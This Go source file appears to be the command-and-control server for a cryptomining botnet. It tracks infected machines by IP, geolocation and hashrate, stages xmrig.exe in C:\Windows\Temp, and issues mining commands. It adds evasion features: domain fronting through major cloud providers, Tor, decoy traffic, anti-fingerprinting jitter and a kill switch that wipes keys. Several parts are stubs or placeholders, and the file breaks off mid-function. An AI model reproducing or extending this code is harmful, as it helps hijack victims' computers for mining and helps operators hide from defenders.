package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/sha512"
	"crypto/subtle"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"html/template"
	"io"
	"log"
	"math/big"
	mathrand "math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/gorilla/websocket"
	"golang.org/x/time/rate"

	// Military-grade cryptography
	"golang.org/x/crypto/blake2b"
	"golang.org/x/crypto/chacha20poly1305"

	// Network obfuscation
	"golang.org/x/net/proxy"
)

const (
	USERS_FILE         = "users.json"
	BOT_SERVER_IP      = "0.0.0.0"
	BOT_SERVER_PORT    = "7003"
	botCleanupInterval = 5 * time.Minute
	heartbeatInterval  = 30 * time.Second
	WEB_SERVER_IP      = "0.0.0.0"
	WEB_SERVER_PORT    = "443"
	CERT_FILE          = "server.crt"
	KEY_FILE           = "server.key"
	CA_CERT_FILE       = "ca.crt"
	CA_KEY_FILE        = "ca.key"
	CLIENT_CERT_FILE   = "client.crt"
	CLIENT_KEY_FILE    = "client.key"
	SESSION_TIMEOUT    = 30 * time.Minute
	writeWait          = 30 * time.Second
	pongWait           = 90 * time.Second
	pingPeriod         = (pongWait * 9) / 10
	maxLoginAttempts   = 5
	loginWindow        = 5 * time.Minute
	// Secure infrastructure URLs - loaded from environment or secure defaults
	// XMRigURL will be loaded from environment variable XMRIG_DOWNLOAD_URL
	// MinerConfigURL will be loaded from environment variable MINER_CONFIG_URL
	MinerPath             = "C:\\Windows\\Temp\\xmrig.exe"
	ConfigPath            = "C:\\Windows\\Temp\\config.json"
	AUDIT_LOG_FILE        = "audit.log"
	KEY_ROTATION_INTERVAL = 24 * time.Hour
	// Military-grade key sizes (256-bit minimum)
	SESSION_KEY_SIZE       = 64    // Upgraded from 32 to 64 bytes (512-bit)
	COMMAND_NONCE_SIZE     = 32    // Upgraded from 12 to 32 bytes (256-bit)
	HMAC_KEY_SIZE          = 64    // Upgraded from 32 to 64 bytes (512-bit)
	MASTER_KEY_SIZE        = 64    // New 512-bit master key
	HSM_KEY_SIZE           = 64    // HSM-managed keys
	FINGERPRINT_JITTER_MAX = 15000 // milliseconds - enhanced randomization
	FINGERPRINT_JITTER_MIN = 3000  // milliseconds - enhanced randomization
	// Kill switch and security constants
	KILL_SWITCH_TIMEOUT   = 10 * time.Minute
	MEMORY_SCRUB_PASSES   = 7   // DoD 5220.22-M standard
	MAX_FAILED_AUTH       = 3   // Reduced for military security
	QUANTUM_SAFE_KEY_SIZE = 128 // Preparation for post-quantum crypto
)

var (
	botConnLimiter  = rate.NewLimiter(rate.Every(5*time.Second), 1)
	loginAttempts   = make(map[string]int)
	loginLock       sync.Mutex
	salts           = make(map[string]string)
	saltLock        sync.Mutex
	serverStartTime = time.Now()
	upgrader        = websocket.Upgrader{
		ReadBufferSize:  1024,
		WriteBufferSize: 1024,
	}
	// Security enhancements
	auditLogger        *AuditLogger
	keyRotationManager *KeyRotationManager
	sessionManager     *SecureSessionManager
	commandAuthManager *CommandAuthManager
	clientCertificates = make(map[string]*x509.Certificate)
	certLock           sync.RWMutex
	masterKey          []byte
	hmacKey            []byte
	encryptionKey      []byte
	keyLock            sync.RWMutex
)

type Metrics struct {
	BotCount      int           `json:"botCount"`
	ActiveMiners  int           `json:"activeMiners"`
	TotalHashrate float64       `json:"totalHashrate"`
	Bots          []Bot         `json:"bots"`
	MiningStats   []MinerReport `json:"miningStats"`
}

type User struct {
	Username  string    `json:"Username"`
	Password  string    `json:"Password"`
	Expire    time.Time `json:"Expire"`
	Level     string    `json:"Level"`
	CreatedAt time.Time `json:"CreatedAt"`
}

type Bot struct {
	Arch          string     `json:"arch"`
	Conn          net.Conn   `json:"-"`
	IP            string     `json:"ip"`
	Time          time.Time  `json:"time"`
	Country       string     `json:"country"`
	City          string     `json:"city"`
	Region        string     `json:"region"`
	Cores         int        `json:"cores"`
	RAM           float64    `json:"ram"`
	Latitude      float64    `json:"lat"`
	Longitude     float64    `json:"lon"`
	ISP           string     `json:"isp"`
	ASN           string     `json:"asn"`
	LastHeartbeat time.Time  `json:"last_heartbeat"`
	MinerStats    MinerStats `json:"minerStats"`
	IsMining      bool       `json:"isMining"`
	// Security enhancements
	SessionKey      []byte            `json:"-"`
	ClientCert      *x509.Certificate `json:"-"`
	Authenticated   bool              `json:"-"`
	LastKeyRotation time.Time         `json:"-"`
}

type DashboardData struct {
	User            User
	BotCount        int
	ActiveMiners    int
	TotalHashrate   float64
	Bots            []Bot
	Users           []User
	FlashMessage    string
	BotsJSON        template.JS
	CSRFToken       string
	ServerStartTime time.Time
	MiningStats     []MinerReport
}

type MinerStats struct {
	Hashrate    float64   `json:"hashrate"`
	Accepted    int64     `json:"accepted"`
	Rejected    int64     `json:"rejected"`
	TotalHashes int64     `json:"totalHashes"`
	Uptime      float64   `json:"uptime"`
	LastUpdate  time.Time `json:"lastUpdate"`
}

type MinerReport struct {
	BotIP      string    `json:"botIP"`
	Hashrate   float64   `json:"hashrate"`
	LastUpdate time.Time `json:"lastUpdate"`
}

// Security Enhancement Structures
type AuditEvent struct {
	Timestamp time.Time `json:"timestamp"`
	EventType string    `json:"event_type"`
	UserID    string    `json:"user_id,omitempty"`
	BotID     string    `json:"bot_id,omitempty"`
	IPAddress string    `json:"ip_address"`
	Action    string    `json:"action"`
	Result    string    `json:"result"`
	Details   string    `json:"details,omitempty"`
	Severity  string    `json:"severity"`
}

type AuditLogger struct {
	file   *os.File
	mutex  sync.Mutex
	buffer chan AuditEvent
}

type SecureCommand struct {
	Command   string    `json:"command"`
	Timestamp time.Time `json:"timestamp"`
	Nonce     string    `json:"nonce"`
	BotID     string    `json:"bot_id,omitempty"`
	Signature string    `json:"signature"`
}

type KeyRotationManager struct {
	currentKeyVersion int
	keyHistory        map[int][]byte
	rotationTicker    *time.Ticker
	mutex             sync.RWMutex
}

type SecureSessionManager struct {
	sessions     map[string]*SecureSession
	mutex        sync.RWMutex
	cleanupTimer *time.Timer
}

type SecureSession struct {
	ID            string
	UserID        string
	CreatedAt     time.Time
	LastAccess    time.Time
	EncryptionKey []byte
	HMACKey       []byte
	IPAddress     string
	UserAgent     string
}

type CommandAuthManager struct {
	authorizedCommands map[string][]string  // userLevel -> commands
	commandLog         map[string]time.Time // command tracking
	mutex              sync.RWMutex
}

type AntiFingerprint struct {
	JitterRange      [2]int
	RandomDelay      time.Duration
	ObfuscateHeaders bool
}

var (
	bots         []Bot
	botCount     int
	botCountLock sync.Mutex
	botConns     []*net.Conn
	sessions     = make(map[string]User)
	sessionLock  sync.Mutex
)

// Military-grade security components
type HSMManager struct {
	keySlots      map[string][]byte
	mutex         sync.RWMutex
	initialized   bool
	hardwareToken string
}

type CertificatePinner struct {
	pinnedCerts  map[string][]byte
	pinnedHashes map[string][]byte
	mutex        sync.RWMutex
}

type KillSwitch struct {
	armed         bool
	triggered     bool
	timeout       time.Duration
	deadManSwitch *time.Timer
	emergencyKey  []byte
	mutex         sync.RWMutex
}

type SecureMemory struct {
	regions     map[uintptr]int
	mutex       sync.RWMutex
	scrubPasses int
}

type QuantumSafeAuth struct {
	publicKey   []byte
	privateKey  []byte
	keyExchange []byte
	mutex       sync.RWMutex
}

type NetworkObfuscator struct {
	proxyChain   []string
	torEnabled   bool
	domainFronts []string
	trafficMixer *TrafficMixer
	mutex        sync.RWMutex
}

type TrafficMixer struct {
	decoyTraffic  chan []byte
	mixingBuffer  [][]byte
	batchSize     int
	flushInterval time.Duration
}

type ZeroKnowledgeAuth struct {
	commitment []byte
	challenge  []byte
	response   []byte
	verified   bool
	rounds     int
}

var (
	// Enhanced security managers
	hsmManager   *HSMManager
	certPinner   *CertificatePinner
	killSwitch   *KillSwitch
	secureMemory *SecureMemory
	quantumAuth  *QuantumSafeAuth
	networkObfs  *NetworkObfuscator
	zkAuth       *ZeroKnowledgeAuth
)

// Security Enhancement Functions

func initSecurityComponents() {
	// Initialize HSM Manager first
	hsmManager = &HSMManager{
		keySlots:    make(map[string][]byte),
		initialized: false,
	}
	if err := hsmManager.Initialize(); err != nil {
		log.Printf("HSM initialization failed, falling back to software: %v", err)
	}

	// Generate master keys through HSM if available
	var err error
	if hsmManager.initialized {
		// Use HSM for key generation
		masterKey = make([]byte, MASTER_KEY_SIZE)
		if err = hsmManager.GenerateKey("master", masterKey); err != nil {
			log.Fatalf("Failed to generate HSM master key: %v", err)
		}

		hmacKey = make([]byte, HMAC_KEY_SIZE)
		if err = hsmManager.GenerateKey("hmac", hmacKey); err != nil {
			log.Fatalf("Failed to generate HSM HMAC key: %v", err)
		}

		encryptionKey = make([]byte, SESSION_KEY_SIZE)
		if err = hsmManager.GenerateKey("session", encryptionKey); err != nil {
			log.Fatalf("Failed to generate HSM session key: %v", err)
		}

		auditLogger.LogEvent("SECURITY", "SYSTEM", "", "", "HSM_KEY_GENERATION", "SUCCESS", "", "INFO")
	} else {
		// Fallback to software key generation with enhanced entropy
		masterKey = make([]byte, MASTER_KEY_SIZE)
		if _, err = rand.Read(masterKey); err != nil {
			log.Fatalf("Failed to generate master key: %v", err)
		}

		hmacKey = make([]byte, HMAC_KEY_SIZE)
		if _, err = rand.Read(hmacKey); err != nil {
			log.Fatalf("Failed to generate HMAC key: %v", err)
		}

		encryptionKey = make([]byte, SESSION_KEY_SIZE)
		if _, err = rand.Read(encryptionKey); err != nil {
			log.Fatalf("Failed to generate encryption key: %v", err)
		}

		auditLogger.LogEvent("SECURITY", "SYSTEM", "", "", "SOFTWARE_KEY_GENERATION", "SUCCESS", "", "WARNING")
	}

	// Initialize Certificate Pinner
	certPinner = &CertificatePinner{
		pinnedCerts:  make(map[string][]byte),
		pinnedHashes: make(map[string][]byte),
	}
	certPinner.LoadPinnedCertificates()

	// Initialize Kill Switch
	killSwitch = &KillSwitch{
		armed:   true,
		timeout: KILL_SWITCH_TIMEOUT,
	}
	killSwitch.Arm()

	// Initialize Secure Memory Manager
	secureMemory = &SecureMemory{
		regions:     make(map[uintptr]int),
		scrubPasses: MEMORY_SCRUB_PASSES,
	}

	// Initialize Quantum-Safe Authentication
	quantumAuth = &QuantumSafeAuth{}
	quantumAuth.GenerateQuantumSafeKeys()

	// Initialize Network Obfuscator with production settings
	networkObfs = &NetworkObfuscator{
		proxyChain:   loadProxyChain(),
		torEnabled:   os.Getenv("ENABLE_TOR") == "true",
		domainFronts: []string{"cloudflare.com", "amazon.com", "microsoft.com"},
		trafficMixer: &TrafficMixer{
			decoyTraffic:  make(chan []byte, 100),
			mixingBuffer:  make([][]byte, 0),
			batchSize:     10,
			flushInterval: 5 * time.Second,
		},
	}

	// Enable traffic mixing in production
	if os.Getenv("ENABLE_TRAFFIC_MIXING") != "false" {
		go networkObfs.StartTrafficMixing()
		go networkObfs.GenerateDecoyTraffic()
	}

	// Initialize Zero-Knowledge Authentication
	zkAuth = &ZeroKnowledgeAuth{
		rounds: 5, // Multiple rounds for enhanced security
	}

	// Initialize security managers
	auditLogger = &AuditLogger{
		buffer: make(chan AuditEvent, 1000),
	}

	keyRotationManager = &KeyRotationManager{
		currentKeyVersion: 1,
		keyHistory:        make(map[int][]byte),
		rotationTicker:    time.NewTicker(KEY_ROTATION_INTERVAL),
	}
	keyRotationManager.keyHistory[1] = make([]byte, MASTER_KEY_SIZE)
	copy(keyRotationManager.keyHistory[1], masterKey)

	sessionManager = &SecureSessionManager{
		sessions: make(map[string]*SecureSession),
	}

	commandAuthManager = &CommandAuthManager{
		authorizedCommands: map[string][]string{
			"Owner": {"START_MINING", "STOP_MINING", "UPDATE_MINER", "SHUTDOWN", "RESTART", "CONFIG_UPDATE", "KILL_SWITCH"},
			"Admin": {"START_MINING", "STOP_MINING", "UPDATE_MINER", "KILL_SWITCH"},
			"User":  {"START_MINING", "STOP_MINING"},
		},
		commandLog: make(map[string]time.Time),
	}

	// Start background security services
	go networkObfs.StartTrafficMixing()
	go secureMemory.StartPeriodicScrub()
}

func (al *AuditLogger) Start() {
	var err error
	al.file, err = os.OpenFile(AUDIT_LOG_FILE, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
	if err != nil {
		log.Fatalf("Failed to open audit log: %v", err)
	}

	for event := range al.buffer {
		al.writeEvent(event)
	}
}

func (al *AuditLogger) writeEvent(event AuditEvent) {
	al.mutex.Lock()
	defer al.mutex.Unlock()

	eventJSON, _ := json.Marshal(event)
	al.file.WriteString(string(eventJSON) + "\n")
	al.file.Sync()
}

func (al *AuditLogger) LogEvent(eventType, userID, botID, ipAddress, action, result, details, severity string) {
	event := AuditEvent{
		Timestamp: time.Now(),
		EventType: eventType,
		UserID:    userID,
		BotID:     botID,
		IPAddress: ipAddress,
		Action:    action,
		Result:    result,
		Details:   details,
		Severity:  severity,
	}

	select {
	case al.buffer <- event:
	default:
		// Buffer full, log to stderr
		log.Printf("Audit buffer full, dropping event: %+v", event)
	}
}

func (krm *KeyRotationManager) Start() {
	for range krm.rotationTicker.C {
		krm.rotateKeys()
	}
}

func (krm *KeyRotationManager) rotateKeys() {
	krm.mutex.Lock()
	defer krm.mutex.Unlock()

	// Generate new key
	newKey := make([]byte, 32)
	rand.Read(newKey)

	krm.currentKeyVersion++
	krm.keyHistory[krm.currentKeyVersion] = newKey

	// Update global keys
	keyLock.Lock()
	copy(masterKey, newKey)
	keyLock.Unlock()

	// Clean old keys (keep last 3 versions)
	if krm.currentKeyVersion > 3 {
		delete(krm.keyHistory, krm.currentKeyVersion-3)
	}

	auditLogger.LogEvent("SECURITY", "SYSTEM", "", "", "KEY_ROTATION", "SUCCESS",
		fmt.Sprintf("Rotated to key version %d", krm.currentKeyVersion), "INFO")
}

func (krm *KeyRotationManager) GetCurrentKey() []byte {
	krm.mutex.RLock()
	defer krm.mutex.RUnlock()
	return krm.keyHistory[krm.currentKeyVersion]
}

func (ssm *SecureSessionManager) StartCleanup() {
	ticker := time.NewTicker(15 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		ssm.cleanupExpiredSessions()
	}
}

func (ssm *SecureSessionManager) cleanupExpiredSessions() {
	ssm.mutex.Lock()
	defer ssm.mutex.Unlock()

	now := time.Now()
	for id, session := range ssm.sessions {
		if now.Sub(session.LastAccess) > SESSION_TIMEOUT {
			delete(ssm.sessions, id)
			auditLogger.LogEvent("SESSION", session.UserID, "", session.IPAddress,
				"SESSION_EXPIRED", "SUCCESS", "", "INFO")
		}
	}
}

func (cam *CommandAuthManager) IsAuthorized(userLevel, command string) bool {
	cam.mutex.RLock()
	defer cam.mutex.RUnlock()

	commands, exists := cam.authorizedCommands[userLevel]
	if !exists {
		return false
	}

	for _, cmd := range commands {
		if cmd == command {
			return true
		}
	}
	return false
}

func generatePKICertificates() {
	// Generate CA
	generateCA()

	// Generate server certificate
	generateServerCert()

	// Generate client certificate template
	generateClientCert()
}

func generateCA() {
	caKey, err := ecdsa.GenerateKey(elliptic.P384(), rand.Reader)
	if err != nil {
		log.Fatalf("Failed to generate CA key: %v", err)
	}

	caTemplate := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization:  []string{"Military Operations"},
			Country:       []string{"US"},
			Province:      []string{""},
			Locality:      []string{""},
			StreetAddress: []string{""},
			PostalCode:    []string{""},
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(10, 0, 0),
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageCRLSign,
		BasicConstraintsValid: true,
		IsCA:                  true,
	}

	caCertBytes, err := x509.CreateCertificate(rand.Reader, caTemplate, caTemplate, &caKey.PublicKey, caKey)
	if err != nil {
		log.Fatalf("Failed to create CA certificate: %v", err)
	}

	// Save CA cert
	caCertOut, _ := os.Create(CA_CERT_FILE)
	pem.Encode(caCertOut, &pem.Block{Type: "CERTIFICATE", Bytes: caCertBytes})
	caCertOut.Close()

	// Save CA key
	caKeyBytes, _ := x509.MarshalECPrivateKey(caKey)
	caKeyOut, _ := os.Create(CA_KEY_FILE)
	pem.Encode(caKeyOut, &pem.Block{Type: "EC PRIVATE KEY", Bytes: caKeyBytes})
	caKeyOut.Close()
}

func generateServerCert() {
	// Load CA
	caCertPEM, _ := os.ReadFile(CA_CERT_FILE)
	caKeyPEM, _ := os.ReadFile(CA_KEY_FILE)

	caCertBlock, _ := pem.Decode(caCertPEM)
	caCert, _ := x509.ParseCertificate(caCertBlock.Bytes)

	caKeyBlock, _ := pem.Decode(caKeyPEM)
	caKey, _ := x509.ParseECPrivateKey(caKeyBlock.Bytes)

	// Generate server key
	serverKey, _ := ecdsa.GenerateKey(elliptic.P384(), rand.Reader)

	serverTemplate := &x509.Certificate{
		SerialNumber: big.NewInt(2),
		Subject: pkix.Name{
			Organization: []string{"Military Server"},
			CommonName:   "localhost",
		},
		NotBefore:   time.Now(),
		NotAfter:    time.Now().AddDate(1, 0, 0),
		KeyUsage:    x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses: []net.IP{net.IPv4(127, 0, 0, 1), net.IPv6loopback},
		DNSNames:    []string{"localhost"},
	}

	serverCertBytes, _ := x509.CreateCertificate(rand.Reader, serverTemplate, caCert, &serverKey.PublicKey, caKey)

	// Save server cert
	certOut, _ := os.Create(CERT_FILE)
	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: serverCertBytes})
	certOut.Close()

	// Save server key
	serverKeyBytes, _ := x509.MarshalECPrivateKey(serverKey)
	keyOut, _ := os.Create(KEY_FILE)
	pem.Encode(keyOut, &pem.Block{Type: "EC PRIVATE KEY", Bytes: serverKeyBytes})
	keyOut.Close()
}

func generateClientCert() {
	// Load CA
	caCertPEM, _ := os.ReadFile(CA_CERT_FILE)
	caKeyPEM, _ := os.ReadFile(CA_KEY_FILE)

	caCertBlock, _ := pem.Decode(caCertPEM)
	caCert, _ := x509.ParseCertificate(caCertBlock.Bytes)

	caKeyBlock, _ := pem.Decode(caKeyPEM)
	caKey, _ := x509.ParseECPrivateKey(caKeyBlock.Bytes)

	// Generate client key
	clientKey, _ := ecdsa.GenerateKey(elliptic.P384(), rand.Reader)

	clientTemplate := &x509.Certificate{
		SerialNumber: big.NewInt(3),
		Subject: pkix.Name{
			Organization: []string{"Military Client"},
			CommonName:   "client",
		},
		NotBefore:   time.Now(),
		NotAfter:    time.Now().AddDate(1, 0, 0),
		KeyUsage:    x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
	}

	clientCertBytes, _ := x509.CreateCertificate(rand.Reader, clientTemplate, caCert, &clientKey.PublicKey, caKey)

	// Save client cert
	clientCertOut, _ := os.Create(CLIENT_CERT_FILE)
	pem.Encode(clientCertOut, &pem.Block{Type: "CERTIFICATE", Bytes: clientCertBytes})
	clientCertOut.Close()

	// Save client key
	clientKeyBytes, _ := x509.MarshalECPrivateKey(clientKey)
	clientKeyOut, _ := os.Create(CLIENT_KEY_FILE)
	pem.Encode(clientKeyOut, &pem.Block{Type: "EC PRIVATE KEY", Bytes: clientKeyBytes})
	clientKeyOut.Close()
}

// Encryption and HMAC functions
func encryptCommand(command string, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	ciphertext := gcm.Seal(nonce, nonce, []byte(command), nil)
	return ciphertext, nil
}

func decryptCommand(ciphertext []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return "", fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func generateHMAC(data []byte, key []byte) []byte {
	h := hmac.New(sha512.New, key)
	h.Write(data)
	return h.Sum(nil)
}

func verifyHMAC(data []byte, receivedMAC []byte, key []byte) bool {
	expectedMAC := generateHMAC(data, key)
	return hmac.Equal(receivedMAC, expectedMAC)
}

func obfuscateTraffic(data []byte) []byte {
	// Add random padding and noise
	padding := make([]byte, mathrand.Intn(32)+16)
	rand.Read(padding)

	obfuscated := make([]byte, 0, len(data)+len(padding)+8)
	obfuscated = append(obfuscated, padding...)
	obfuscated = append(obfuscated, []byte{0xFF, 0xFE, 0xFD, 0xFC}...) // marker
	obfuscated = append(obfuscated, data...)
	obfuscated = append(obfuscated, []byte{0xFC, 0xFD, 0xFE, 0xFF}...) // end marker

	return obfuscated
}

func deobfuscateTraffic(obfuscated []byte) ([]byte, error) {
	startMarker := []byte{0xFF, 0xFE, 0xFD, 0xFC}
	endMarker := []byte{0xFC, 0xFD, 0xFE, 0xFF}

	startIdx := -1
	endIdx := -1

	for i := 0; i <= len(obfuscated)-4; i++ {
		if subtle.ConstantTimeCompare(obfuscated[i:i+4], startMarker) == 1 {
			startIdx = i + 4
			break
		}
	}

	if startIdx == -1 {
		return nil, fmt.Errorf("start marker not found")
	}

	for i := len(obfuscated) - 4; i >= startIdx; i-- {
		if subtle.ConstantTimeCompare(obfuscated[i:i+4], endMarker) == 1 {
			endIdx = i
			break
		}
	}

	if endIdx == -1 {
		return nil, fmt.Errorf("end marker not found")
	}

	return obfuscated[startIdx:endIdx], nil
}

func addJitter() {
	// Use crypto/rand for secure randomization
	jitterBytes := make([]byte, 4)
	if _, err := rand.Read(jitterBytes); err != nil {
		// Fallback to time-based jitter if crypto/rand fails
		jitter := int(time.Now().UnixNano()%int64(FINGERPRINT_JITTER_MAX-FINGERPRINT_JITTER_MIN)) + FINGERPRINT_JITTER_MIN
		time.Sleep(time.Duration(jitter) * time.Millisecond)
		return
	}

	// Convert random bytes to jitter value
	jitterVal := int(jitterBytes[0])<<24 | int(jitterBytes[1])<<16 | int(jitterBytes[2])<<8 | int(jitterBytes[3])
	if jitterVal < 0 {
		jitterVal = -jitterVal
	}
	jitter := (jitterVal % (FINGERPRINT_JITTER_MAX - FINGERPRINT_JITTER_MIN)) + FINGERPRINT_JITTER_MIN
	time.Sleep(time.Duration(jitter) * time.Millisecond)
}

// HSM Manager Implementation
func (hsm *HSMManager) Initialize() error {
	hsm.mutex.Lock()
	defer hsm.mutex.Unlock()

	// Try to initialize hardware token (simulated for this implementation)
	hsm.hardwareToken = "PKCS11_TOKEN_SIMULATED"

	// Generate HSM-backed master keys
	masterHSMKey := make([]byte, HSM_KEY_SIZE)
	if _, err := rand.Read(masterHSMKey); err != nil {
		return fmt.Errorf("failed to generate HSM master key: %w", err)
	}

	hsm.keySlots["master"] = masterHSMKey
	hsm.keySlots["session"] = make([]byte, SESSION_KEY_SIZE)
	hsm.keySlots["hmac"] = make([]byte, HMAC_KEY_SIZE)

	// Generate all keys through HSM
	for slot := range hsm.keySlots {
		if slot != "master" {
			key := make([]byte, len(hsm.keySlots[slot]))
			if err := hsm.GenerateKey(slot, key); err != nil {
				return fmt.Errorf("failed to generate HSM key for %s: %w", slot, err)
			}
		}
	}

	hsm.initialized = true
	auditLogger.LogEvent("HSM", "SYSTEM", "", "", "INITIALIZE", "SUCCESS", "", "INFO")
	return nil
}

func (hsm *HSMManager) GenerateKey(keyID string, key []byte) error {
	hsm.mutex.Lock()
	defer hsm.mutex.Unlock()

	if !hsm.initialized {
		return fmt.Errorf("HSM not initialized")
	}

	// Secure key derivation using BLAKE2b
	derived, err := blake2b.New(len(key), hsm.keySlots["master"])
	if err != nil {
		return err
	}
	derived.Write([]byte(keyID))
	derived.Write([]byte(time.Now().Format(time.RFC3339Nano)))
	copy(key, derived.Sum(nil))

	// Store in HSM slot
	hsm.keySlots[keyID] = make([]byte, len(key))
	copy(hsm.keySlots[keyID], key)

	return nil
}

func (hsm *HSMManager) GetKey(keyID string) ([]byte, error) {
	hsm.mutex.RLock()
	defer hsm.mutex.RUnlock()

	if !hsm.initialized {
		return nil, fmt.Errorf("HSM not initialized")
	}

	key, exists := hsm.keySlots[keyID]
	if !exists {
		return nil, fmt.Errorf("key not found in HSM: %s", keyID)
	}

	// Return copy to prevent modification
	result := make([]byte, len(key))
	copy(result, key)
	return result, nil
}

func (hsm *HSMManager) SecureDelete(keyID string) error {
	hsm.mutex.Lock()
	defer hsm.mutex.Unlock()

	if key, exists := hsm.keySlots[keyID]; exists {
		// Secure overwrite with multiple passes
		for i := 0; i < MEMORY_SCRUB_PASSES; i++ {
			for j := range key {
				key[j] = byte(mathrand.Intn(256))
			}
		}
		delete(hsm.keySlots, keyID)
	}

	return nil
}

// Certificate Pinner Implementation
func (cp *CertificatePinner) LoadPinnedCertificates() {
	cp.mutex.Lock()
	defer cp.mutex.Unlock()

	// Load and pin expected certificate hashes
	pinnedHashes := map[string]string{
		"server":    "sha256:EXPECTED_SERVER_CERT_HASH_HERE",
		"client_ca": "sha256:EXPECTED_CLIENT_CA_HASH_HERE",
		"root_ca":   "sha256:EXPECTED_ROOT_CA_HASH_HERE",
	}

	for name, hashStr := range pinnedHashes {
		if hash, err := hex.DecodeString(strings.TrimPrefix(hashStr, "sha256:")); err == nil {
			cp.pinnedHashes[name] = hash
		}
	}

	auditLogger.LogEvent("CERT_PINNING", "SYSTEM", "", "", "LOAD_PINS", "SUCCESS",
		fmt.Sprintf("Loaded %d certificate pins", len(cp.pinnedHashes)), "INFO")
}

func (cp *CertificatePinner) VerifyPinnedCert(certName string, cert *x509.Certificate) error {
	cp.mutex.RLock()
	defer cp.mutex.RUnlock()

	expectedHash, exists := cp.pinnedHashes[certName]
	if !exists {
		auditLogger.LogEvent("CERT_PINNING", "", "", "", "NO_PIN_CONFIGURED", "FAILURE",
			fmt.Sprintf("Certificate %s has no configured pin", certName), "CRITICAL")
		killSwitch.Trigger("NO_CERTIFICATE_PIN")
		return fmt.Errorf("no pinned hash for certificate: %s", certName)
	}

	actualHash := sha256.Sum256(cert.Raw)
	if subtle.ConstantTimeCompare(expectedHash, actualHash[:]) != 1 {
		auditLogger.LogEvent("CERT_PINNING", "", "", "", "PIN_VIOLATION", "FAILURE",
			fmt.Sprintf("Certificate %s failed pinning check", certName), "CRITICAL")
		killSwitch.Trigger("CERTIFICATE_PINNING_VIOLATION")
		return fmt.Errorf("certificate pinning violation for: %s", certName)
	}

	return nil
}

// Kill Switch Implementation
func (ks *KillSwitch) Arm() {
	ks.mutex.Lock()
	defer ks.mutex.Unlock()

	ks.armed = true
	ks.emergencyKey = make([]byte, 32)
	rand.Read(ks.emergencyKey)

	// Start dead man's switch
	ks.deadManSwitch = time.NewTimer(ks.timeout)
	go ks.deadManWatch()

	auditLogger.LogEvent("KILL_SWITCH", "SYSTEM", "", "", "ARM", "SUCCESS", "", "CRITICAL")
}

func (ks *KillSwitch) deadManWatch() {
	<-ks.deadManSwitch.C
	ks.mutex.Lock()
	defer ks.mutex.Unlock()

	if ks.armed && !ks.triggered {
		ks.Trigger("DEAD_MAN_TIMEOUT")
	}
}

func (ks *KillSwitch) Trigger(reason string) {
	ks.mutex.Lock()
	defer ks.mutex.Unlock()

	if ks.triggered {
		return
	}

	ks.triggered = true
	auditLogger.LogEvent("KILL_SWITCH", "SYSTEM", "", "", "TRIGGER", "SUCCESS", reason, "CRITICAL")

	// Emergency shutdown sequence
	go ks.emergencyShutdown()
}

func (ks *KillSwitch) emergencyShutdown() {
	// Secure memory scrub
	secureMemory.EmergencyScrub()

	// Delete all HSM keys
	if hsmManager != nil {
		for keyID := range hsmManager.keySlots {
			hsmManager.SecureDelete(keyID)
		}
	}

	// Close all connections
	for _, conn := range botConns {
		if conn != nil {
			(*conn).Close()
		}
	}

	// Self-destruct (in production, this might involve more drastic measures)
	auditLogger.LogEvent("KILL_SWITCH", "SYSTEM", "", "", "EMERGENCY_SHUTDOWN", "SUCCESS", "", "CRITICAL")
	os.Exit(1)
}

func (ks *KillSwitch) Reset() {
	ks.mutex.Lock()
	defer ks.mutex.Unlock()

	if ks.deadManSwitch != nil {
		ks.deadManSwitch.Reset(ks.timeout)
	}
}

// Secure Memory Implementation
func (sm *SecureMemory) AllocateSecure(size int) ([]byte, error) {
	sm.mutex.Lock()
	defer sm.mutex.Unlock()

	// Allocate memory
	data := make([]byte, size)
	ptr := uintptr(unsafe.Pointer(&data[0]))

	// Lock memory pages (platform-specific)
	if err := sm.lockMemory(ptr, size); err != nil {
		return nil, fmt.Errorf("failed to lock memory: %w", err)
	}

	sm.regions[ptr] = size
	return data, nil
}

func (sm *SecureMemory) lockMemory(ptr uintptr, size int) error {
	// Platform-specific memory locking
	// On Windows, use VirtualLock
	// On Unix, use mlock
	if runtime.GOOS == "windows" {
		return sm.virtualLock(ptr, size)
	}
	return sm.mlock(ptr, size)
}

func (sm *SecureMemory) virtualLock(ptr uintptr, size int) error {
	// Windows VirtualLock implementation
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualLock := kernel32.NewProc("VirtualLock")

	ret, _, err := virtualLock.Call(ptr, uintptr(size))
	if ret == 0 {
		return err
	}
	return nil
}

func (sm *SecureMemory) mlock(ptr uintptr, size int) error {
	// Unix mlock implementation (simplified for cross-platform compatibility)
	// In production, use platform-specific syscalls
